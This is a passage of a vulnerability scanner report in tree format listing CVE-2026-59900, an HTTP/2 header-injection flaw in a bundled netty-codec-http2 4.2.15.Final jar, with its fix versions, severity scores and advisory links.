                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-59921 
                        │      │                  ├ [1]: https://github.com/netty/netty 
                        │      │                  ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.1.
                        │      │                  │      136.Final 
                        │      │                  ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.2.
                        │      │                  │      16.Final 
                        │      │                  ├ [4]: https://github.com/netty/netty/security/advisories/GHS
                        │      │                  │      A-gcjf-9mgh-3p7g 
                        │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59921 
                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-59921 
                        │      ├ PublishedDate   : 2026-07-28T23:17:09.923Z 
                        │      ╰ LastModifiedDate: 2026-07-28T23:17:09.923Z 
                        ╰ [12] ╭ VulnerabilityID : CVE-2026-59900 
                               ├ VendorIDs        ─ [0]: GHSA-c69g-56f8-xwqj 
                               ├ PkgName         : io.netty:netty-codec-http2 
                               ├ PkgPath         : openaf/Kube/netty-codec-http2-4.2.15.Final.jar 
                               ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http2@4.2.15.Final 
                               │                  ╰ UID : c30b5fd76294dbfd 
                               ├ InstalledVersion: 4.2.15.Final 
                               ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
                               ├ Status          : fixed 
                               ├ Layer            ╭ Digest: sha256:b56b1740507a3573c47aa19399fc8c140d8af1c78c89
                               │                  │         6fcd143a3c4b92a52b66 
                               │                  ╰ DiffID: sha256:7a79226c6a40e2b31852468e4ec7a9289271678303c2
                               │                            2092636c1395e68b9953 
                               ├ SeveritySource  : ghsa 
                               ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59900 
                               ├ DataSource       ╭ ID  : ghsa 
                               │                  ├ Name: GitHub Security Advisory Maven 
                               │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                               │                          cosystem%3Amaven 
                               ├ Fingerprint     : sha256:d648ee30c1656a5d9c5afd93c0afff6ec97f81dfb90bbcc6c7e1e
                               │                   95ca0c0b8cf 
                               ├ Title           : io.netty/netty-codec-http2: Netty: Improper header
                               │                   neutralization in netty-codec-http2 
                               ├ Description     : A flaw was found in Netty's netty-codec-http2 component. The
                               │                    HTTP/2 encoder does not properly handle special characters
                               │                   in HTTP headers. This vulnerability allows a remote attacker
                               │                    to craft specific HTTP/2 requests, leading to HTTP response
                               │                    splitting and header injection attacks. Such attacks can
                               │                   enable an attacker to manipulate web content or inject
                               │                   malicious headers. 
                               ├ Severity        : MEDIUM 
                               ├ VendorSeverity   ╭ ghsa  : 2 
                               │                  ╰ redhat: 2 
                               ├ CVSS             ╭ ghsa   ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/
                               │                  │        │            VI:N/VA:N/SC:L/SI:L/SA:N 
                               │                  │        ╰ V40Score : 6.9 
                               │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H
                               │                           │           /A:N 
                               │                           ╰ V3Score : 6.5 
                               ╰ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-59900 
                                                  ├ [1]: https://github.com/netty/netty 
                                                  ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.1.
                                                  │      136.Final 
                                                  ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.2.
                                                  │      16.Final 
                                                  ├ [4]: https://github.com/netty/netty/security/advisories/GHS
                                                  │      A-c69g-56f8-xwqj 
                                                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59900 
                                                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-59900 
```
